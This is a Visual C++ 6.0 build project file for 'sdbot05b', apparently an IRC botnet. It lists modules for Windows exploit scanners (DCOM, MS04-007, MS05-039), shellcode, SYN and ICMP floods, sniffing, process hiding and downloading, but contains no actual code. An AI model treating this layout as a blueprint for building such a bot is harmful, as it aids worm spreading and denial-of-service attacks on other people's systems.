# Microsoft Developer Studio Project File - Name="sdbot05b" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=SDBOT05B - WIN32 RELEASE
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "sdbot05b.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "sdbot05b.mak" CFG="SDBOT05B - WIN32 RELEASE"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "sdbot05b - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "sdbot05b - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "sdbot05b - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib ws2_32.lib wininet.lib Netapi32.lib shlwapi.lib Mpr.lib Dnsapi.lib /nologo /subsystem:windows /machine:I386 /align:4096
# SUBTRACT LINK32 /pdb:none

!ELSEIF  "$(CFG)" == "sdbot05b - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "sdbot05b___Win32_Debug"
# PROP BASE Intermediate_Dir "sdbot05b___Win32_Debug"
# PROP BASE Ignore_Export_Lib 0
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "sdbot05b___Win32_Debug"
# PROP Intermediate_Dir "sdbot05b___Win32_Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /D "_DEBUG" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib ws2_32.lib wininet.lib /nologo /subsystem:windows /machine:I386 /align:4096
# SUBTRACT BASE LINK32 /pdb:none
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib ws2_32.lib wininet.lib Netapi32.lib shlwapi.lib Mpr.lib Dnsapi.lib /nologo /subsystem:windows /machine:I386 /align:4096
# SUBTRACT LINK32 /pdb:none

!ENDIF 

# Begin Target

# Name "sdbot05b - Win32 Release"
# Name "sdbot05b - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "scanners"

# PROP Default_Filter "cpp"
# Begin Source File

SOURCE=.\advscan.cpp
# End Source File
# Begin Source File

SOURCE=.\dcom.cpp
# End Source File
# Begin Source File

SOURCE=.\ms04_007_asn1.cpp
# End Source File
# Begin Source File

SOURCE=".\MS05-039-pp.cpp"
# End Source File
# Begin Source File

SOURCE=.\shellcode.cpp
# End Source File
# Begin Source File

SOURCE=.\tftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\wks.CPP
# End Source File
# Begin Source File

SOURCE=.\wkssvc.cpp
# End Source File
# End Group
# Begin Group "protocal source"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\dns.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\aliaslog.cpp
# End Source File
# Begin Source File

SOURCE=.\AutoStart.cpp
# End Source File
# Begin Source File

SOURCE=.\avirus.cpp
# End Source File
# Begin Source File

SOURCE=.\download.cpp
# End Source File
# Begin Source File

SOURCE=.\driveinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\fphost.cpp
# End Source File
# Begin Source File

SOURCE=.\ftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\hostauth.cpp
# End Source File
# Begin Source File

SOURCE=.\icmpflood.cpp
# End Source File
# Begin Source File

SOURCE=.\identd.cpp
# End Source File
# Begin Source File

SOURCE=.\irc_send.cpp
# End Source File
# Begin Source File

SOURCE=.\loaddll.cpp
# End Source File
# Begin Source File

SOURCE=.\misc.cpp
# End Source File
# Begin Source File

SOURCE=.\net.cpp
# End Source File
# Begin Source File

SOURCE=.\netutils.cpp
# End Source File
# Begin Source File

SOURCE=.\processes.cpp
# End Source File
# Begin Source File

SOURCE=.\rndnick.cpp
# End Source File
# Begin Source File

SOURCE=.\SDBOT05B.CPP
# ADD CPP /O1
# End Source File
# Begin Source File

SOURCE=.\secure.cpp
# End Source File
# Begin Source File

SOURCE=.\sniffer.cpp
# End Source File
# Begin Source File

SOURCE=.\socks.cpp
# End Source File
# Begin Source File

SOURCE=.\synflood.cpp
# End Source File
# Begin Source File

SOURCE=.\taskhider.cpp
# End Source File
# Begin Source File

SOURCE=.\threads.cpp
# End Source File
# Begin Source File

SOURCE=.\visit.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;"
# Begin Group "scanner headers"

# PROP Default_Filter "h"
# Begin Source File

SOURCE=.\advscan.h
# End Source File
# Begin Source File

SOURCE=.\dcom.h
# End Source File
# Begin Source File

SOURCE=.\ms04_007_asn1.h
# End Source File
# Begin Source File

SOURCE=".\MS05-039-pp.h"
# End Source File
# Begin Source File

SOURCE=.\passwd.h
# End Source File
# Begin Source File

SOURCE=.\shellcode.h
# End Source File
# Begin Source File

SOURCE=.\tftpd.h
# End Source File
# Begin Source File

SOURCE=.\wks.h
# End Source File
# Begin Source File

SOURCE=.\wkssvc.h
# End Source File
# End Group
# Begin Group "protocal headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\dns.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\aliaslog.h
# End Source File
# Begin Source File

SOURCE=.\autostart.h
# End Source File
# Begin Source File

SOURCE=.\avirus.h
# End Source File
# Begin Source File

SOURCE=.\config.h
# End Source File
# Begin Source File

SOURCE=.\Defines.h
# End Source File
# Begin Source File

SOURCE=.\download.h
# End Source File
# Begin Source File

SOURCE=.\driveinfo.h
# End Source File
# Begin Source File

SOURCE=.\extern.h
# End Source File
# Begin Source File

SOURCE=.\fphost.h
# End Source File
# Begin Source File

SOURCE=.\ftpd.h
# End Source File
# Begin Source File

SOURCE=.\functions.h
# End Source File
# Begin Source File

SOURCE=.\hostauth.h
# End Source File
# Begin Source File

SOURCE=.\icmpflood.h
# End Source File
# Begin Source File

SOURCE=.\identd.h
# End Source File
# Begin Source File

SOURCE=.\Includes.h
# End Source File
# Begin Source File

SOURCE=.\irc_send.h
# End Source File
# Begin Source File

SOURCE=.\loaddll.h
# End Source File
# Begin Source File

SOURCE=.\misc.h
# End Source File
# Begin Source File

SOURCE=.\net.h
# End Source File
# Begin Source File

SOURCE=.\netheaders.h
# End Source File
# Begin Source File

SOURCE=.\netutils.h
# End Source File
# Begin Source File

SOURCE=.\processes.h
# End Source File
# Begin Source File

SOURCE=.\rndnick.h
# End Source File
# Begin Source File

SOURCE=.\sdbot05b.h
# End Source File
# Begin Source File

SOURCE=.\secure.h
# End Source File
# Begin Source File

SOURCE=.\sniffer.h
# End Source File
# Begin Source File

SOURCE=.\socks.h
# End Source File
# Begin Source File

SOURCE=.\synflood.h
# End Source File
# Begin Source File

SOURCE=.\taskhider.h
# End Source File
# Begin Source File

SOURCE=.\tcpip.h
# End Source File
# Begin Source File

SOURCE=.\threads.h
# End Source File
# Begin Source File

SOURCE=.\visit.h
# End Source File
# End Group
# End Target
# End Project
